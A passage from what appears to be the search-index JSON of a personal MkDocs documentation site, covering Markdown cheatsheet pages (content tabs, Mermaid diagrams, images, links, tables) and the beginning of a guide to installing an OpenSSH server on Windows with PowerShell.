i.e. #! , directly followed by the corresponding language shortcode Example: Inline code block The `#!python range()` function is used to generate a sequence of numbers. Result: The range () function is used to generate a sequence of numbers.", "title": "Highlighting Inline Code Blocks"}, {"location": "utilities/markdown-cheatsheet/content-tabs/", "tags": ["markdown-cheatsheet", "mkdocs", "content-tabs"], "text": "Markdown Content Tabs \u00b6 Sometimes, it's desirable to group alternative content under different tabs, e.g. when describing how to access an API from different languages or environments. Material for MkDocs allows for beautiful and functional tabs, grouping code blocks and other content. Usage \u00b6 Grouping code blocks \u00b6 Code blocks are one of the primary targets to be grouped, and can be considered a special case of content tabs, as tabs with a single code block are always rendered without horizontal spacing: Example: Content tabs with code blocks === \"C\" ``` c #include <stdio.h> int main(void) { printf(\"Hello world!\\n\"); return 0; } ``` === \"C++\" ``` c++ #include <iostream> int main(void) { std::cout << \"Hello world!\" << std::endl; return 0; } ``` Result: C C++ #include <stdio.h> int main ( void ) { printf ( \"Hello world! \\n \" ); return 0 ; } #include <iostream> int main ( void ) { std :: cout << \"Hello world!\" << std :: endl ; return 0 ; } Grouping other content \u00b6 When a content tab contains more than one code block, it is rendered with horizontal spacing. Vertical spacing is never added, but can be achieved by nesting tabs in other blocks: Example: Content tabs === \"Unordered list\" * Sed sagittis eleifend rutrum * Donec vitae suscipit est * Nulla tempor lobortis orci === \"Ordered list\" 1. Sed sagittis eleifend rutrum 2. Donec vitae suscipit est 3. Nulla tempor lobortis orci Result: Unordered list Ordered list Sed sagittis eleifend rutrum Donec vitae suscipit est Nulla tempor lobortis orci Sed sagittis eleifend rutrum Donec vitae suscipit est Nulla tempor lobortis orci Embedded content \u00b6 When [SuperFences] is enabled, content tabs can contain arbitrary nested content, including further content tabs, and can be nested in other blocks like [admonitions] or blockquotes: Example: Content tabs in admonition !!! example === \"Unordered List\" ``` markdown * Sed sagittis eleifend rutrum * Donec vitae suscipit est * Nulla tempor lobortis orci ``` === \"Ordered List\" ``` markdown 1. Sed sagittis eleifend rutrum 2. Donec vitae suscipit est 3. Nulla tempor lobortis orci ``` Result: Example Unordered List Ordered List * Sed sagittis eleifend rutrum * Donec vitae suscipit est * Nulla tempor lobortis orci 1. Sed sagittis eleifend rutrum 2. Donec vitae suscipit est 3. Nulla tempor lobortis orci", "title": "Content Tabs"}, {"location": "utilities/markdown-cheatsheet/content-tabs/#markdown-content-tabs", "text": "Sometimes, it's desirable to group alternative content under different tabs, e.g. when describing how to access an API from different languages or environments. Material for MkDocs allows for beautiful and functional tabs, grouping code blocks and other content.", "title": "Markdown Content Tabs"}, {"location": "utilities/markdown-cheatsheet/content-tabs/#usage", "text": "", "title": "Usage"}, {"location": "utilities/markdown-cheatsheet/content-tabs/#grouping-code-blocks", "text": "Code blocks are one of the primary targets to be grouped, and can be considered a special case of content tabs, as tabs with a single code block are always rendered without horizontal spacing: Example: Content tabs with code blocks === \"C\" ``` c #include <stdio.h> int main(void) { printf(\"Hello world!\\n\"); return 0; } ``` === \"C++\" ``` c++ #include <iostream> int main(void) { std::cout << \"Hello world!\" << std::endl; return 0; } ``` Result: C C++ #include <stdio.h> int main ( void ) { printf ( \"Hello world! \\n \" ); return 0 ; } #include <iostream> int main ( void ) { std :: cout << \"Hello world!\" << std :: endl ; return 0 ; }", "title": "Grouping code blocks"}, {"location": "utilities/markdown-cheatsheet/content-tabs/#grouping-other-content", "text": "When a content tab contains more than one code block, it is rendered with horizontal spacing. Vertical spacing is never added, but can be achieved by nesting tabs in other blocks: Example: Content tabs === \"Unordered list\" * Sed sagittis eleifend rutrum * Donec vitae suscipit est * Nulla tempor lobortis orci === \"Ordered list\" 1. Sed sagittis eleifend rutrum 2. Donec vitae suscipit est 3. Nulla tempor lobortis orci Result: Unordered list Ordered list Sed sagittis eleifend rutrum Donec vitae suscipit est Nulla tempor lobortis orci Sed sagittis eleifend rutrum Donec vitae suscipit est Nulla tempor lobortis orci", "title": "Grouping other content"}, {"location": "utilities/markdown-cheatsheet/content-tabs/#embedded-content", "text": "When [SuperFences] is enabled, content tabs can contain arbitrary nested content, including further content tabs, and can be nested in other blocks like [admonitions] or blockquotes: Example: Content tabs in admonition !!! example === \"Unordered List\" ``` markdown * Sed sagittis eleifend rutrum * Donec vitae suscipit est * Nulla tempor lobortis orci ``` === \"Ordered List\" ``` markdown 1. Sed sagittis eleifend rutrum 2. Donec vitae suscipit est 3. Nulla tempor lobortis orci ``` Result: Example Unordered List Ordered List * Sed sagittis eleifend rutrum * Donec vitae suscipit est * Nulla tempor lobortis orci 1. Sed sagittis eleifend rutrum 2. Donec vitae suscipit est 3. Nulla tempor lobortis orci", "title": "Embedded content"}, {"location": "utilities/markdown-cheatsheet/diagrams/", "tags": ["markdown-cheatsheet", "mkdocs", "diagram", "mermaid"], "text": "Mermaid Diagrams \u00b6 Diagrams help to communicate complex relationships and interconnections between different technical components, and are a great addition to project documentation. Material for MkDocs integrates with Mermaid.js , a very popular and flexible solution for drawing diagrams. Usage \u00b6 Using Flowcharts \u00b6 Flowcharts are diagrams that represent workflows or processes. The steps are rendered as nodes of various kinds and are connected by edges, describing the necessary order of steps: Flow chart ```mermaid graph LR A[Start] --> B{Error?}; B -->|Yes| C[Hmm...]; C --> D[Debug]; D --> B; B ---->|No| E[Yay!]; ``` Result: graph LR A[Start] --> B{Error?}; B -->|Yes| C[Hmm...]; C --> D[Debug]; D --> B; B ---->|No| E[Yay!]; Using Sequence Diagrams \u00b6 Sequence diagrams describe a specific scenario as sequential interactions between multiple objects or actors, including the messages that are exchanged between those actors: Sequence diagram ```mermaid sequenceDiagram Alice->>John: Hello John, how are you? loop Healthcheck John->>John: Fight against hypochondria end Note right of John: Rational thoughts! John-->>Alice: Great! John->>Bob: How about you? Bob-->>John: Jolly good! ``` Result: sequenceDiagram Alice->>John: Hello John, how are you? loop Healthcheck John->>John: Fight against hypochondria end Note right of John: Rational thoughts! John-->>Alice: Great! John->>Bob: How about you? Bob-->>John: Jolly good! Using State Diagrams \u00b6 State diagrams are a great tool to describe the behavior of a system, decomposing it into a finite number of states, and transitions between those states: State diagram ```mermaid stateDiagram-v2 state fork_state <<fork>> [*] --> fork_state fork_state --> State2 fork_state --> State3 state join_state <<join>> State2 --> join_state State3 --> join_state join_state --> State4 State4 --> [*] ``` Result: stateDiagram-v2 state fork_state <<fork>> [*] --> fork_state fork_state --> State2 fork_state --> State3 state join_state <<join>> State2 --> join_state State3 --> join_state join_state --> State4 State4 --> [*] Using Class Diagrams \u00b6 Class diagrams are central to object oriented programing, describing the structure of a system by modelling entities as classes and relationships between them: Class diagram ```mermaid classDiagram Person <|-- Student Person <|-- Professor Person : +String name Person : +String phoneNumber Person : +String emailAddress Person: +purchaseParkingPass() Address \"1\" <-- \"0..1\" Person:lives at class Student{ +int studentNumber +int averageMark +isEligibleToEnrol() +getSeminarsTaken() } class Professor{ +int salary } class Address{ +String street +String city +String state +int postalCode +String country -validate() +outputAsLabel() } ``` Result: classDiagram Person <|-- Student Person <|-- Professor Person : +String name Person : +String phoneNumber Person : +String emailAddress Person: +purchaseParkingPass() Address \"1\" <-- \"0..1\" Person:lives at class Student{ +int studentNumber +int averageMark +isEligibleToEnrol() +getSeminarsTaken() } class Professor{ +int salary } class Address{ +String street +String city +String state +int postalCode +String country -validate() +outputAsLabel() } Using Entity-Relationship Diagrams \u00b6 An entity-relationship diagram is composed of entity types and specifies relationships that exist between entities. It describes inter-related things in a specific domain of knowledge: Entity-relationship diagram ```mermaid erDiagram CUSTOMER ||--o{ ORDER : places ORDER ||--|{ LINE-ITEM : contains CUSTOMER }|..|{ DELIVERY-ADDRESS : uses ``` Result: erDiagram CUSTOMER ||--o{ ORDER : places ORDER ||--|{ LINE-ITEM : contains CUSTOMER }|..|{ DELIVERY-ADDRESS : uses", "title": "Diagrams"}, {"location": "utilities/markdown-cheatsheet/diagrams/#mermaid-diagrams", "text": "Diagrams help to communicate complex relationships and interconnections between different technical components, and are a great addition to project documentation. Material for MkDocs integrates with Mermaid.js , a very popular and flexible solution for drawing diagrams.", "title": "Mermaid Diagrams"}, {"location": "utilities/markdown-cheatsheet/diagrams/#usage", "text": "", "title": "Usage"}, {"location": "utilities/markdown-cheatsheet/diagrams/#using-flowcharts", "text": "Flowcharts are diagrams that represent workflows or processes. The steps are rendered as nodes of various kinds and are connected by edges, describing the necessary order of steps: Flow chart ```mermaid graph LR A[Start] --> B{Error?}; B -->|Yes| C[Hmm...]; C --> D[Debug]; D --> B; B ---->|No| E[Yay!]; ``` Result: graph LR A[Start] --> B{Error?}; B -->|Yes| C[Hmm...]; C --> D[Debug]; D --> B; B ---->|No| E[Yay!];", "title": "Using Flowcharts"}, {"location": "utilities/markdown-cheatsheet/diagrams/#using-sequence-diagrams", "text": "Sequence diagrams describe a specific scenario as sequential interactions between multiple objects or actors, including the messages that are exchanged between those actors: Sequence diagram ```mermaid sequenceDiagram Alice->>John: Hello John, how are you? loop Healthcheck John->>John: Fight against hypochondria end Note right of John: Rational thoughts! John-->>Alice: Great! John->>Bob: How about you? Bob-->>John: Jolly good! ``` Result: sequenceDiagram Alice->>John: Hello John, how are you? loop Healthcheck John->>John: Fight against hypochondria end Note right of John: Rational thoughts! John-->>Alice: Great! John->>Bob: How about you? Bob-->>John: Jolly good!", "title": "Using Sequence Diagrams"}, {"location": "utilities/markdown-cheatsheet/diagrams/#using-state-diagrams", "text": "State diagrams are a great tool to describe the behavior of a system, decomposing it into a finite number of states, and transitions between those states: State diagram ```mermaid stateDiagram-v2 state fork_state <<fork>> [*] --> fork_state fork_state --> State2 fork_state --> State3 state join_state <<join>> State2 --> join_state State3 --> join_state join_state --> State4 State4 --> [*] ``` Result: stateDiagram-v2 state fork_state <<fork>> [*] --> fork_state fork_state --> State2 fork_state --> State3 state join_state <<join>> State2 --> join_state State3 --> join_state join_state --> State4 State4 --> [*]", "title": "Using State Diagrams"}, {"location": "utilities/markdown-cheatsheet/diagrams/#using-class-diagrams", "text": "Class diagrams are central to object oriented programing, describing the structure of a system by modelling entities as classes and relationships between them: Class diagram ```mermaid classDiagram Person <|-- Student Person <|-- Professor Person : +String name Person : +String phoneNumber Person : +String emailAddress Person: +purchaseParkingPass() Address \"1\" <-- \"0..1\" Person:lives at class Student{ +int studentNumber +int averageMark +isEligibleToEnrol() +getSeminarsTaken() } class Professor{ +int salary } class Address{ +String street +String city +String state +int postalCode +String country -validate() +outputAsLabel() } ``` Result: classDiagram Person <|-- Student Person <|-- Professor Person : +String name Person : +String phoneNumber Person : +String emailAddress Person: +purchaseParkingPass() Address \"1\" <-- \"0..1\" Person:lives at class Student{ +int studentNumber +int averageMark +isEligibleToEnrol() +getSeminarsTaken() } class Professor{ +int salary } class Address{ +String street +String city +String state +int postalCode +String country -validate() +outputAsLabel() }", "title": "Using Class Diagrams"}, {"location": "utilities/markdown-cheatsheet/diagrams/#using-entity-relationship-diagrams", "text": "An entity-relationship diagram is composed of entity types and specifies relationships that exist between entities. It describes inter-related things in a specific domain of knowledge: Entity-relationship diagram ```mermaid erDiagram CUSTOMER ||--o{ ORDER : places ORDER ||--|{ LINE-ITEM : contains CUSTOMER }|..|{ DELIVERY-ADDRESS : uses ``` Result: erDiagram CUSTOMER ||--o{ ORDER : places ORDER ||--|{ LINE-ITEM : contains CUSTOMER }|..|{ DELIVERY-ADDRESS : uses", "title": "Using Entity-Relationship Diagrams"}, {"location": "utilities/markdown-cheatsheet/external-markdown/", "tags": ["markdown-cheatsheet", "mkdocs", "external-markdown"], "text": "Embed External Markdown \u00b6 MkDocs Embed External Markdown plugin that allows to inject section or full markdown content from a given url. The goal is to embed different markdown from different sources inside your MkDocs project. For more detailed inforation follow the link: Mkdocs Embed External Markdown Plugin Usage \u00b6 Section defined by \"##/###/####...\" header (h2/h3/h4...) \"#\" header (h1) will be removed from source content so you can use use your own header \"##/###/####...\" header (h2/h3/h4...) will be removed from source section content so you can use use your own header Supports multiple sections from any source external_markdown requires 2 parameters: url and section name . {{ external_markdown('url', '## section name') }} Full Markdown Content \u00b6 Embed full markdown content from a given url, you can use the following example: {{ external_markdown('https://raw.githubusercontent.com/fire1ce/DDNS-Cloudflare-Bash/main/README.md', '') }} Specific Section \u00b6 Embed markdown section from a given url, you can use the following example: {{ external_markdown('https://raw.githubusercontent.com/fire1ce/DDNS-Cloudflare-Bash/main/README.md', '## Installation') }}", "title": "Embed External Markdown"}, {"location": "utilities/markdown-cheatsheet/external-markdown/#embed-external-markdown", "text": "MkDocs Embed External Markdown plugin that allows to inject section or full markdown content from a given url. The goal is to embed different markdown from different sources inside your MkDocs project. For more detailed inforation follow the link: Mkdocs Embed External Markdown Plugin", "title": "Embed External Markdown"}, {"location": "utilities/markdown-cheatsheet/external-markdown/#usage", "text": "Section defined by \"##/###/####...\" header (h2/h3/h4...) \"#\" header (h1) will be removed from source content so you can use use your own header \"##/###/####...\" header (h2/h3/h4...) will be removed from source section content so you can use use your own header Supports multiple sections from any source external_markdown requires 2 parameters: url and section name . {{ external_markdown('url', '## section name') }}", "title": "Usage"}, {"location": "utilities/markdown-cheatsheet/external-markdown/#full-markdown-content", "text": "Embed full markdown content from a given url, you can use the following example: {{ external_markdown('https://raw.githubusercontent.com/fire1ce/DDNS-Cloudflare-Bash/main/README.md', '') }}", "title": "Full Markdown Content"}, {"location": "utilities/markdown-cheatsheet/external-markdown/#specific-section", "text": "Embed markdown section from a given url, you can use the following example: {{ external_markdown('https://raw.githubusercontent.com/fire1ce/DDNS-Cloudflare-Bash/main/README.md', '## Installation') }}", "title": "Specific Section"}, {"location": "utilities/markdown-cheatsheet/icons/", "tags": ["markdown-cheatsheet", "mkdocs", "icons", "emojis"], "text": "Icons & Emojis \u00b6 One of the best features of Material for MkDocs is the possibility to use more then with thousands of emojis in your project documentation with practically zero additional effort. Use Mkdocs Material Icon Search to find the icons and emojis you need. Usage \u00b6 Example: :fontawesome-regular-bell: - Fontawesome Icon: Bell :material-bell: - Material Icon: Bell :octicons-bell-24: - Octicons Icon: Bell :bell: - Emoji: Bell Result: - Fontawesome Icon: Bell - Material Icon: Bell - Octicons Icon: Bell - Emoji: Bell Keyboard Keys Icons \u00b6 Example: ++ctrl+alt+del++ ++cmd+control+option++ Result: Ctrl + Alt + Del Cmd + Ctrl + Option", "title": "Icons & Emojis"}, {"location": "utilities/markdown-cheatsheet/icons/#icons-emojis", "text": "One of the best features of Material for MkDocs is the possibility to use more then with thousands of emojis in your project documentation with practically zero additional effort. Use Mkdocs Material Icon Search to find the icons and emojis you need.", "title": "Icons &amp; Emojis"}, {"location": "utilities/markdown-cheatsheet/icons/#usage", "text": "Example: :fontawesome-regular-bell: - Fontawesome Icon: Bell :material-bell: - Material Icon: Bell :octicons-bell-24: - Octicons Icon: Bell :bell: - Emoji: Bell Result: - Fontawesome Icon: Bell - Material Icon: Bell - Octicons Icon: Bell - Emoji: Bell", "title": "Usage"}, {"location": "utilities/markdown-cheatsheet/icons/#keyboard-keys-icons", "text": "Example: ++ctrl+alt+del++ ++cmd+control+option++ Result: Ctrl + Alt + Del Cmd + Ctrl + Option", "title": "Keyboard Keys Icons"}, {"location": "utilities/markdown-cheatsheet/images/", "tags": ["markdown-cheatsheet", "mkdocs", "images"], "text": "Markdown Images \u00b6 Markdown is a text format so naturally you can type in the Markdown representation of an image using examples below to put an image reference directly into the editor. Warning This site uses the Material Design for MkDocs theme with the following CSS overrides there for the results in your case may differ. Custom css /* images css */ . md-typeset img { border-radius : 5 px ; height : auto ; max-width : 95 % ; margin : auto ; display : block ; box-shadow : rgba ( 149 , 157 , 165 , 0.2 ) 0 px 8 px 24 px ; } Embedding Images \u00b6 Internal soruce example ![minion][internal-source] [ internal-source ]: /assets/images/markdown-cheatsheet/minion.png 'Title of the image' External source example ![minion][external-source] [ external-source ]: https://octodex.github.com/images/minion.png 'Title of the image' Result: Embedding Images With Width Attributes \u00b6 width=200 example ![minion][internal-source]{: style=\"width:200px\"} [ internal-source ]: /assets/images/markdown-cheatsheet/minion.png 'Title of the image' Result:", "title": "Images"}, {"location": "utilities/markdown-cheatsheet/images/#markdown-images", "text": "Markdown is a text format so naturally you can type in the Markdown representation of an image using examples below to put an image reference directly into the editor. Warning This site uses the Material Design for MkDocs theme with the following CSS overrides there for the results in your case may differ. Custom css /* images css */ . md-typeset img { border-radius : 5 px ; height : auto ; max-width : 95 % ; margin : auto ; display : block ; box-shadow : rgba ( 149 , 157 , 165 , 0.2 ) 0 px 8 px 24 px ; }", "title": "Markdown Images"}, {"location": "utilities/markdown-cheatsheet/images/#embedding-images", "text": "Internal soruce example ![minion][internal-source] [ internal-source ]: /assets/images/markdown-cheatsheet/minion.png 'Title of the image' External source example ![minion][external-source] [ external-source ]: https://octodex.github.com/images/minion.png 'Title of the image' Result:", "title": "Embedding Images"}, {"location": "utilities/markdown-cheatsheet/images/#embedding-images-with-width-attributes", "text": "width=200 example ![minion][internal-source]{: style=\"width:200px\"} [ internal-source ]: /assets/images/markdown-cheatsheet/minion.png 'Title of the image' Result:", "title": "Embedding Images With Width Attributes"}, {"location": "utilities/markdown-cheatsheet/links/", "tags": ["markdown-cheatsheet", "mkdocs", "links"], "text": "Markdown Links \u00b6 Link With Title \u00b6 Link with Title Example [ My Github Page ][ github-url ] [ github-url ]: https://github.com/fire1ce 'Title of the link' Result: My Github Page Open In New Tab \u00b6 Append (target=\\_blank) to the end of the link. Open In New Tab Link Example [ My Github Page ][ github-url ]{target=\\_blank} [ github-url ]: https://github.com/fire1ce 'Title of the link' Result: My Github Page Result: Internal Anchor Links \u00b6 Internal Anchor Links Example [ Jumps to section in page ][ internal-anchor-link ] [ internal-anchor-link ]: /guides/markdown-cheatsheet/tables-lists-quotes/#lists 'Internal Anchor Links' Result: Jumps to section in page Image With Links \u00b6 Image With Links Example [ ![This is Image with link ][ image-link ]][url-link]{target=\\_blank} [ image-link ]: /assets/images/markdown-cheatsheet/minion200x200.png 'Minion' [ url-link ]: https://github.com/fire1ce 'Go to Github' Result: Mailto Link \u00b6 Mailto Link Example [ Send Email ][ mail-to-link ] [ mail-to-link ]: mailto:example@example.com 'Send Email' Result: Send Email", "title": "Links"}, {"location": "utilities/markdown-cheatsheet/links/#markdown-links", "text": "", "title": "Markdown Links"}, {"location": "utilities/markdown-cheatsheet/links/#link-with-title", "text": "Link with Title Example [ My Github Page ][ github-url ] [ github-url ]: https://github.com/fire1ce 'Title of the link' Result: My Github Page", "title": "Link With Title"}, {"location": "utilities/markdown-cheatsheet/links/#open-in-new-tab", "text": "Append (target=\\_blank) to the end of the link. Open In New Tab Link Example [ My Github Page ][ github-url ]{target=\\_blank} [ github-url ]: https://github.com/fire1ce 'Title of the link' Result: My Github Page Result:", "title": "Open In New Tab"}, {"location": "utilities/markdown-cheatsheet/links/#internal-anchor-links", "text": "Internal Anchor Links Example [ Jumps to section in page ][ internal-anchor-link ] [ internal-anchor-link ]: /guides/markdown-cheatsheet/tables-lists-quotes/#lists 'Internal Anchor Links' Result: Jumps to section in page", "title": "Internal Anchor Links"}, {"location": "utilities/markdown-cheatsheet/links/#image-with-links", "text": "Image With Links Example [ ![This is Image with link ][ image-link ]][url-link]{target=\\_blank} [ image-link ]: /assets/images/markdown-cheatsheet/minion200x200.png 'Minion' [ url-link ]: https://github.com/fire1ce 'Go to Github' Result:", "title": "Image With Links"}, {"location": "utilities/markdown-cheatsheet/links/#mailto-link", "text": "Mailto Link Example [ Send Email ][ mail-to-link ] [ mail-to-link ]: mailto:example@example.com 'Send Email' Result: Send Email", "title": "Mailto Link"}, {"location": "utilities/markdown-cheatsheet/tables-lists-quotes/", "tags": ["markdown-cheatsheet", "mkdocs", "tables", "lists", "quotes"], "text": "Tables, Lists and Quotes \u00b6 Tables \u00b6 A table in Markdown consists of two parts: the header and the rows of data in the table. As per the Markdown spec: pipe (|) character separates the individual columns in a table. (-) hyphens act as a delimiter row to separate the header row from the body. (:) colon to align cell contents. Table Example | **Option** | **Description** | | ---------- | ------------------------------------------ | | data | path to data files to supply the data. | | engine | engine to be used for processing templates | | ext | extension to be used for dest files. | Result: Option Description data path to data files to supply the data. engine engine to be used for processing templates ext extension to be used for dest files. Column Alignment \u00b6 If you want to align a specific column to the left , center or right , you can use the [regular Markdown syntax] placing : characters at the beginning and/or end of the divider. Left Center Right Data table, columns aligned to left | Method | Description | | :---------- | :----------------------------------- | | `GET` | :material-check: Fetch resource | | `PUT` | :material-check-all: Update resource | | `DELETE` | :material-close: Delete resource | Method Description GET Fetch resource PUT Update resource DELETE Delete resource Data table, columns centered | Method | Description | | :---------: | :----------------------------------: | | `GET` | :material-check: Fetch resource | | `PUT` | :material-check-all: Update resource | | `DELETE` | :material-close: Delete resource | Method Description GET Fetch resource PUT Update resource DELETE Delete resource Data table, columns aligned to right | Method | Description | | ----------: | -----------------------------------: | | `GET` | :material-check: Fetch resource | | `PUT` | :material-check-all: Update resource | | `DELETE` | :material-close: Delete resource | Method Description GET Fetch resource PUT Update resource DELETE Delete resource Lists \u00b6 Unordered List \u00b6 Bullet point lists can be created by starting each line with an asterisk followed by a space before the content of the bullet point. Note that the space is important and should not be forgotten. Example: Unordered List Example - Lorem ipsum dolor sit amet - Consectetur adipiscing elit - Integer molestie lorem at massa - Facilisis in pretium nisl aliquet Result: Lorem ipsum dolor sit amet Consectetur adipiscing elit Integer molestie lorem at massa Facilisis in pretium nisl aliquet Ordered List \u00b6 Similarly, numbered lists can be created by starting each line with a number followed by a space and then the relevant text. Ordered List Example 1. Lorem ipsum dolor sit amet 2. Consectetur adipiscing elit 3. Integer molestie lorem at massa 4. Faucibus porta lacus fringilla vel 5. Aenean sit amet erat nunc 6. Eget porttitor lorem Result: Lorem ipsum dolor sit amet Consectetur adipiscing elit Integer molestie lorem at massa Faucibus porta lacus fringilla vel Aenean sit amet erat nunc Eget porttitor lorem Blocks List \u00b6 Blocks List Example > - list under lists > - under lists Result: list under lists under lists Tasklists \u00b6 A task list is a set of tasks that each render on a separate line with a clickable checkbox. You can select or deselect the checkboxes to mark the tasks as complete or incomplete. You can use Markdown to create a task list in any comment on GitHub. If you reference an issue, pull request, or discussion in a task list, the reference will unfurl to show the title and state. Example: Task List Example - [x] Lorem ipsum dolor sit amet, consectetur adipiscing elit - [ ] Vestibulum convallis sit amet nisi a tincidunt - [x] In hac habitasse platea dictumst - [x] In scelerisque nibh non dolor mollis congue sed et metus - [ ] Praesent sed risus massa - [ ] Aenean pretium efficitur erat, donec pharetra, ligula non scelerisque Result: Lorem ipsum dolor sit amet, consectetur adipiscing elit Vestibulum convallis sit amet nisi a tincidunt In hac habitasse platea dictumst In scelerisque nibh non dolor mollis congue sed et metus Praesent sed risus massa Aenean pretium efficitur erat, donec pharetra, ligula non scelerisque Block Quotes \u00b6 For quoting blocks of content from another source within your document. Add > before any text you want to quote. Quoting Blocks Example > Lorem ipsum dolor sit amet, consectetur adipiscing elit. Integer posuere erat a ante. > Donec massa lacus, ultricies a ullamcorper in, fermentum sed augue. Result: Lorem ipsum dolor sit amet, consectetur adipiscing elit. Integer posuere erat a ante. Donec massa lacus, ultricies a ullamcorper in, fermentum sed augue. Nested Block Quotes \u00b6 Quoting Blocks Nested Example > Lorem ipsum dolor sit amet, consectetur adipiscing elit. Integer posuere erat a ante. > Donec massa lacus, ultricies a ullamcorper in, fermentum sed augue. > > > Sed adipiscing elit vitae augue consectetur a gravida nunc vehicula. Donec auctorodio > > non est accumsan facilisis. Aliquam id turpis in dolor tincidunt mollis ac eu diam. Result: Lorem ipsum dolor sit amet, consectetur adipiscing elit. Integer posuere erat a ante. Donec massa lacus, ultricies a ullamcorper in, fermentum sed augue. Sed adipiscing elit vitae augue consectetur a gravida nunc vehicula. Donec auctorodio non est accumsan facilisis. Aliquam id turpis in dolor tincidunt mollis ac eu diam.", "title": "Tables, Lists and Quotes"}, {"location": "utilities/markdown-cheatsheet/tables-lists-quotes/#tables-lists-and-quotes", "text": "", "title": "Tables, Lists and Quotes"}, {"location": "utilities/markdown-cheatsheet/tables-lists-quotes/#tables", "text": "A table in Markdown consists of two parts: the header and the rows of data in the table. As per the Markdown spec: pipe (|) character separates the individual columns in a table. (-) hyphens act as a delimiter row to separate the header row from the body. (:) colon to align cell contents. Table Example | **Option** | **Description** | | ---------- | ------------------------------------------ | | data | path to data files to supply the data. | | engine | engine to be used for processing templates | | ext | extension to be used for dest files. | Result: Option Description data path to data files to supply the data. engine engine to be used for processing templates ext extension to be used for dest files.", "title": "Tables"}, {"location": "utilities/markdown-cheatsheet/tables-lists-quotes/#column-alignment", "text": "If you want to align a specific column to the left , center or right , you can use the [regular Markdown syntax] placing : characters at the beginning and/or end of the divider. Left Center Right Data table, columns aligned to left | Method | Description | | :---------- | :----------------------------------- | | `GET` | :material-check: Fetch resource | | `PUT` | :material-check-all: Update resource | | `DELETE` | :material-close: Delete resource | Method Description GET Fetch resource PUT Update resource DELETE Delete resource Data table, columns centered | Method | Description | | :---------: | :----------------------------------: | | `GET` | :material-check: Fetch resource | | `PUT` | :material-check-all: Update resource | | `DELETE` | :material-close: Delete resource | Method Description GET Fetch resource PUT Update resource DELETE Delete resource Data table, columns aligned to right | Method | Description | | ----------: | -----------------------------------: | | `GET` | :material-check: Fetch resource | | `PUT` | :material-check-all: Update resource | | `DELETE` | :material-close: Delete resource | Method Description GET Fetch resource PUT Update resource DELETE Delete resource", "title": "Column Alignment"}, {"location": "utilities/markdown-cheatsheet/tables-lists-quotes/#lists", "text": "", "title": "Lists"}, {"location": "utilities/markdown-cheatsheet/tables-lists-quotes/#unordered-list", "text": "Bullet point lists can be created by starting each line with an asterisk followed by a space before the content of the bullet point. Note that the space is important and should not be forgotten. Example: Unordered List Example - Lorem ipsum dolor sit amet - Consectetur adipiscing elit - Integer molestie lorem at massa - Facilisis in pretium nisl aliquet Result: Lorem ipsum dolor sit amet Consectetur adipiscing elit Integer molestie lorem at massa Facilisis in pretium nisl aliquet", "title": "Unordered List"}, {"location": "utilities/markdown-cheatsheet/tables-lists-quotes/#ordered-list", "text": "Similarly, numbered lists can be created by starting each line with a number followed by a space and then the relevant text. Ordered List Example 1. Lorem ipsum dolor sit amet 2. Consectetur adipiscing elit 3. Integer molestie lorem at massa 4. Faucibus porta lacus fringilla vel 5. Aenean sit amet erat nunc 6. Eget porttitor lorem Result: Lorem ipsum dolor sit amet Consectetur adipiscing elit Integer molestie lorem at massa Faucibus porta lacus fringilla vel Aenean sit amet erat nunc Eget porttitor lorem", "title": "Ordered List"}, {"location": "utilities/markdown-cheatsheet/tables-lists-quotes/#blocks-list", "text": "Blocks List Example > - list under lists > - under lists Result: list under lists under lists", "title": "Blocks List"}, {"location": "utilities/markdown-cheatsheet/tables-lists-quotes/#tasklists", "text": "A task list is a set of tasks that each render on a separate line with a clickable checkbox. You can select or deselect the checkboxes to mark the tasks as complete or incomplete. You can use Markdown to create a task list in any comment on GitHub. If you reference an issue, pull request, or discussion in a task list, the reference will unfurl to show the title and state. Example: Task List Example - [x] Lorem ipsum dolor sit amet, consectetur adipiscing elit - [ ] Vestibulum convallis sit amet nisi a tincidunt - [x] In hac habitasse platea dictumst - [x] In scelerisque nibh non dolor mollis congue sed et metus - [ ] Praesent sed risus massa - [ ] Aenean pretium efficitur erat, donec pharetra, ligula non scelerisque Result: Lorem ipsum dolor sit amet, consectetur adipiscing elit Vestibulum convallis sit amet nisi a tincidunt In hac habitasse platea dictumst In scelerisque nibh non dolor mollis congue sed et metus Praesent sed risus massa Aenean pretium efficitur erat, donec pharetra, ligula non scelerisque", "title": "Tasklists"}, {"location": "utilities/markdown-cheatsheet/tables-lists-quotes/#block-quotes", "text": "For quoting blocks of content from another source within your document. Add > before any text you want to quote. Quoting Blocks Example > Lorem ipsum dolor sit amet, consectetur adipiscing elit. Integer posuere erat a ante. > Donec massa lacus, ultricies a ullamcorper in, fermentum sed augue. Result: Lorem ipsum dolor sit amet, consectetur adipiscing elit. Integer posuere erat a ante. Donec massa lacus, ultricies a ullamcorper in, fermentum sed augue.", "title": "Block Quotes"}, {"location": "utilities/markdown-cheatsheet/tables-lists-quotes/#nested-block-quotes", "text": "Quoting Blocks Nested Example > Lorem ipsum dolor sit amet, consectetur adipiscing elit. Integer posuere erat a ante. > Donec massa lacus, ultricies a ullamcorper in, fermentum sed augue. > > > Sed adipiscing elit vitae augue consectetur a gravida nunc vehicula. Donec auctorodio > > non est accumsan facilisis. Aliquam id turpis in dolor tincidunt mollis ac eu diam. Result: Lorem ipsum dolor sit amet, consectetur adipiscing elit. Integer posuere erat a ante. Donec massa lacus, ultricies a ullamcorper in, fermentum sed augue. Sed adipiscing elit vitae augue consectetur a gravida nunc vehicula. Donec auctorodio non est accumsan facilisis. Aliquam id turpis in dolor tincidunt mollis ac eu diam.", "title": "Nested Block Quotes"}, {"location": "windows/ssh-server/", "tags": ["windows", "ssh-server", "powershell", "rsa-keys"], "text": "Windows SSH Server \u00b6 Sometime you need to connect to a remote server via SSH . Usually it's the main connection to linux servers. But you can also connect to a windows server via SSH . At this guide we will show you how to install and configure a windows ssh server, including SSH Keys authentication . SSH Server Installation on Windows \u00b6 We will be using PowerShell to install the SSH server inculding the SSH client. Open PowerShell Terminal as Administrator. Run the following commands to install the SSH server and client. Add-WindowsCapability -Online -Name OpenSSH . Client ~~~~ 0 . 0 . 1 . 0 Add-WindowsCapability -Online -Name OpenSSH . Server ~~~~ 0 . 0 . 1 . 0 After the installaton you can check the Windows SSH server and client are installed. Get-WindowsCapability -Online | Where-Object Name -like 'OpenSSH*' The output will be something like this: To start the Windows SSH server service Start-Service sshd Enable Windows SSH Server on Windows Boot Set-Service -Name sshd -StartupType 'Automatic' Add a Firewall rule to allow the SSH port if (!( Get-NetFirewallRule -Name \"OpenSSH-Server-In-TCP\" -ErrorAction SilentlyContinue 